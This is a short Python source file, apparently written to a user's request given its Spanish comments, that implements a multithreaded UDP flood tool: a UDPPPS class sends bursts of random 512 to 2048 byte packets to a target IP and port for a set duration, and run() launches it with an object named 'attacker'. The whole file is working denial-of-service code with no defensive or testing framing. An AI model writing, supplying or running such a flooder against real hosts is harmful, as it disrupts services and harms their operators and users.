import socket
import threading
import os
import time
import random

class UDPPPS:
    def __init__(self, ip, port, threads, stop_event=None):
        self.ip = ip
        self.port = port
        self.threads = threads
        self.stop_event = stop_event
        self.on = False

    def flood(self, duration):
        self.on = True
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send, daemon=True)
            t.start()
            threads.append(t)

        end_time = time.time() + duration
        try:
            while time.time() < end_time and self.on:
                if self.stop_event and self.stop_event.is_set():
                    break
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.on = False

    def send(self):
        while self.on:
            if self.stop_event and self.stop_event.is_set():
                break
            try:
                packet_size = random.choice([512, 1024, 2048])
                data = os.urandom(packet_size)
                burst_count = self.threads  # 5 bursts igual a los threads
                for _ in range(burst_count):
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(data, (self.ip, self.port))
                    s.close()
                time.sleep(0.01)
            except Exception:
                pass

def run(ip, port, duration, stop_event):
    # Solo 5 threads como pediste
    attacker = UDPPPS(ip, port, threads=5, stop_event=stop_event)
    attacker.flood(duration)
